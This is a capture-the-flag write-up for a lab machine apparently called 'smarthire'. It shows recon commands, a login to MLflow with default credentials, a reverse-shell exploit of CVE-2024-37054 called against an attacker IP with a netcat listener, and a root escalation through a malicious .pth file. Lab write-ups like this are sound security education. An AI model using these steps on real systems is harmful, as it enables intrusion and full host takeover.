
## 1. Reconnaissance

### Port Scan

Starting with an Nmap service scan to identify the attack surface:

```bash
nmap -sV smarthire.htb
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Three open ports: SSH on 22, a DNS service on 53, and an nginx web server on 80. The web server is the primary entry point.

---

## 2. Enumeration

### Web Application

Browsing to `http://smarthire.htb` reveals a resume analysis platform. The application allows users to upload a CSV file with `experience` and `skills` columns and returns a candidate fit score between 0 and 100.

### Virtual Host Discovery

Since only one domain was known, virtual host fuzzing was performed to discover additional subdomains:

```bash
ffuf -u http://smarthire.htb/ \
  -H "Host: FUZZ.smarthire.htb" \
  -w subdomains-top1million-5000.txt \
  -fc 404,301
```

```
models   [Status: 401, Size: 137, Duration: 42ms]
```

A `models` subdomain was discovered, returning a **401 Unauthorized** response with the following header:

```
WWW-Authenticate: Basic realm="mlflow"
```

This confirms that an **MLflow tracking server** is running at `http://models.smarthire.htb`.

### MLflow Default Credentials

MLflow ships with default credentials (`admin:password`) when authentication is enabled without explicit configuration. Testing these credentials grants full access to the MLflow UI.

After logging in, the MLflow version is visible in the interface: **2.14.1**.

---

## 3. Foothold — CVE-2024-37054 (MLflow Pickle Deserialization RCE)

### Vulnerability Overview

**CVE-2024-37054** is a critical (CVSS 8.8) remote code execution vulnerability in MLflow ≤ 2.14.1. When a model is registered and then loaded for prediction, MLflow calls `pickle.loads()` on the serialized model artifact without any sanitization. An attacker with write access to the MLflow tracking server can upload a malicious pickle payload, which is executed server-side when the application calls `/predict`.

### Exploitation

The exploit automates the full attack chain: authenticating to the web application, registering a malicious model version on the MLflow server, and triggering deserialization via the `/predict` endpoint.

Set up a listener:

```bash
nc -lv 4444
```

Run the exploit:

```bash
python3 CVE-2024-37054_poc.py \
  http://smarthire.htb \
  http://models.smarthire.htb \
  10.10.17.186 4444 \
  --mlflow-creds admin:password \
  --app-username lexor \
  --app-password kali
```

The exploit executes the following steps:

1. Authenticates to the web application as a legitimate user
2. Generates a Python reverse shell payload serialized as a pickle object
3. Registers the malicious artifact under the existing production model (`google-47829b07cf11-model`)
4. Triggers deserialization by sending a prediction request to `/predict`

```
[+] Model registered: google-47829b07cf11-model (v5)
[+] Payload uploaded successfully (255 bytes)
[+] Request timed out - shell should be connected!
```

A reverse shell is received:

```bash
svcweb@smarthire:/var/www/smarthire.htb$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

### User Flag

```bash
cat /home/svcweb/user.txt
fb06326f14151bfc3d41e824803a7755
```

---

## 4. Privilege Escalation — Python `.pth` Hijack via Writable Site Directory

### Sudo Enumeration

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The user can execute `mlflowctl.py` as root without a password. The wildcard `*` allows arbitrary arguments to be passed.

### Analyzing the Plugin Directory

Listing the script's working directory reveals a plugin structure:

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x  core/   (root:root)
drwxrwxr-x  dev/    (root:devs)   ← writable by group devs
```

The `dev/` directory is writable by the `devs` group, which `svcweb` belongs to. Running the script with the `backup-models` argument confirms it loads a plugin from this directory:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
[*] Running backup via backup_models plugin...
```

### Vulnerability — Python `site` Module Abuse

`mlflowctl.py` internally calls `site.addsitedir()` on the `dev/` plugin directory, registering it as a Python site directory. The Python `site` module automatically processes any `.pth` files found in registered site directories — **and executes any line beginning with `import`** at interpreter startup.

Since `dev/` is group-writable and the script runs as root, placing a malicious `.pth` file there causes arbitrary code execution in the root context.

### Exploitation

```bash
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
```

```bash
root@smarthire:/opt/tools/mlflow_ctl/plugins# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
cat /root/root.txt
0c1ad9a87f3218699ab5bf023c24fae4
```
